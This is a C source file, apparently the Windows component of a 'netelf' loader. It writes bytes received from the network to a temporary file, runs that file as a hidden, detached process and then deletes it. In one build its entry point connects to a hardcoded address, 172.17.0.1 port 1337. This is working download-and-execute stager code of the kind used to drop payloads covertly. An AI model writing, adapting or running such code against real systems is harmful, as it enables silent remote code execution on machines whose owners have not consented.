#define NETELF_OVERRIDE_FILE
#define USE_RECV

#ifdef NODEFAULTLIB
# define QUIET
# define NEED_STRCHR
# define NEED_MEMSET
# define NEED_WIN32_MALLOC_FREE
# define NETELF_NEED_LIB_C
#else
# include <stdio.h>
#endif

#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "wsock32.lib")
#include <windows.h>


#ifdef NEED_WIN32_MALLOC_FREE
void *malloc(size_t size) {
	return HeapAlloc(GetProcessHeap(), 0, size);
}

void *realloc(void *ptr, size_t new_size) {
	return HeapReAlloc(GetProcessHeap(), 0, ptr, new_size);
}

void free(void *ptr) {
	HeapFree(GetProcessHeap(), 0, ptr);
}
#endif


struct ne_file_s {
	TCHAR name[MAX_PATH];
	HANDLE handle;
};
typedef struct ne_file_s ne_file_t;


static int
file_open(file)
	ne_file_t *file;
{
	TCHAR lpTempPathBuffer[MAX_PATH];
	DWORD dwShareMode;
	DWORD dwFlagsAndAttributes;
	HANDLE hFile;

	if (!GetTempPath(MAX_PATH, lpTempPathBuffer))
		return 1;

	if (!GetTempFileName(lpTempPathBuffer, NULL, 0, file->name))
		return 2;

	dwShareMode = FILE_SHARE_READ | FILE_SHARE_WRITE;
	dwFlagsAndAttributes = FILE_ATTRIBUTE_TEMPORARY;
	hFile = CreateFile(file->name, GENERIC_WRITE, dwShareMode, NULL, OPEN_EXISTING, dwFlagsAndAttributes, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
		return 3;

	file->handle = hFile;
	return 0;
}


static unsigned int
file_write(file, buf, nbytes)
	ne_file_t *file;
	void *buf;
	unsigned int nbytes;
{
	DWORD byteswritten = 0;
	WriteFile(file->handle, buf, nbytes, &byteswritten, NULL);
	return byteswritten;
}

// https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/
static char *
argv_to_cmdline( unsigned int argc, char **argv ) {
#define EMITN(x,n) do { unsigned _i; for (_i = 0; _i < (n); _i++) dst[sofar++] = x; } while (0)
#define EMIT(x) EMITN(x,1)
#define EMITALL do { unsigned _i = 0; while (arg[_i]) dst[sofar++] = arg[_i++]; } while (0)
	char *dst = malloc(1024 * 32);
	size_t sofar = 0;
	size_t argIndex;

	for( argIndex = 0; argIndex < argc; ++argIndex ) {
		const char *arg = argv[argIndex];
		if( ! arg )
			break;

		if( argIndex )
			EMIT(' ');
		const int quote =
			strchr(arg, ' ') != NULL ||
			strchr(arg, '"') != NULL ||
			strchr(arg, '\t') != NULL ||
			strchr(arg, '\v') != NULL ||
			*arg == '\0';
		if( ! quote ) {
			EMITALL;
			continue;
		}

		EMIT('"');
		for( const char *It = arg; ; ++It ) {
			unsigned NumberBackslashes = 0;
			while( *It && *It == '\\' ) {
				++It;
				++NumberBackslashes;
			}

			if( ! *It ) {
				EMITN('\\', NumberBackslashes * 2);
				break;
			}
			else if( *It == '"' ) {
				EMITN('\\', NumberBackslashes * 2 + 1);
				EMIT(*It);
			}
			else {
				EMITN('\\', NumberBackslashes);
				EMIT(*It);
			}
		}

		EMIT('"');
	}
	EMIT('\0');
	return dst;

#undef EMIT
#undef EMITN
#undef EMITALL
}


static int
file_exec(file, argc, argv)
	ne_file_t *file;
	unsigned int argc;
	char **argv;
{
	STARTUPINFO startInfo;
	PROCESS_INFORMATION processInfo;
	DWORD dwFlags = 0;
	BOOL ret;
	char *cmdline = argv_to_cmdline(argc, argv);

	ZeroMemory(&startInfo, sizeof(startInfo));
	ZeroMemory(&processInfo, sizeof(processInfo));

	startInfo.cb = sizeof(startInfo);
	startInfo.dwFlags = STARTF_USESHOWWINDOW;	
	
#ifdef QUIET
	dwFlags = DETACHED_PROCESS;
# ifdef CREATE_NO_WINDOW
	dwFlags |= CREATE_NO_WINDOW;
# endif
	startInfo.wShowWindow = SW_HIDE;
#endif

	CloseHandle(file->handle);
	ret = CreateProcessA(file->name, cmdline, NULL, NULL, FALSE, dwFlags,
						 NULL, NULL, &startInfo, &processInfo);
#ifndef QUIET
	if (!ret) {
		perror("CreateProcessA");
	}
#endif

	DeleteFile(file->name);

	if (ret) {
		CloseHandle(processInfo.hProcess);
		CloseHandle(processInfo.hThread);
	}

	return ret ? 0 : 1;
}



#ifdef NODEFAULTLIB
# define NETELF_NO_MAIN
static int run_netelf(const char *ip_addr, int port);

void WinMainCRTStartup()
{
	ExitProcess(run_netelf("172.17.0.1", 1337));
}
#endif
